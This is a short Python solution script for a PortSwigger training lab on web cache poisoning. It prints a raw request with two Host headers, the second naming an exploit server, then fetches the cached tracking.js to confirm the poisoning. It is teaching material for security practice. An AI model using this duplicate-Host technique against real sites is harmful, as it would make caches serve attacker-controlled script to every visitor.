"""
Lab 3: Web cache poisoning via ambiguous requests
https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
Difficulty: Practitioner

📝 Send TWO Host headers in one request — the cache and the origin can
disagree about which one is authoritative. If the origin uses the second
(malicious) one to build a reflected URL, but the CACHE keys only on the
first (legitimate-looking) one, the poisoned response gets cached under
the real hostname for everyone.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
REAL_HOST = "YOUR-LAB-ID.web-security-academy.net"
MALICIOUS_HOST = "exploit-YOUR-LAB-ID.exploit-server.net"


def run():
    s = get_session()

    note("requests/urllib3 don't cleanly support sending duplicate headers")
    note("through the high-level API — this is a case where Burp Repeater's")
    note("raw request editor (just type a second Host: line directly) is")
    note("genuinely simpler than fighting the Python HTTP client about it.")
    note("Raw request shape to send via Burp:")
    print(f"""
GET /resources/js/tracking.js HTTP/1.1
Host: {REAL_HOST}
Host: {MALICIOUS_HOST}

""")

    note("After poisoning, verify by fetching the same path fresh (no")
    note("special headers) and checking whether the response reflects the")
    note("malicious host anywhere, or carries a cache-hit indicator.")
    r = s.get(f"{TARGET}/resources/js/tracking.js")
    log(f"Verification fetch status: {r.status_code}")
    print(r.text[:300])


if __name__ == "__main__":
    run()
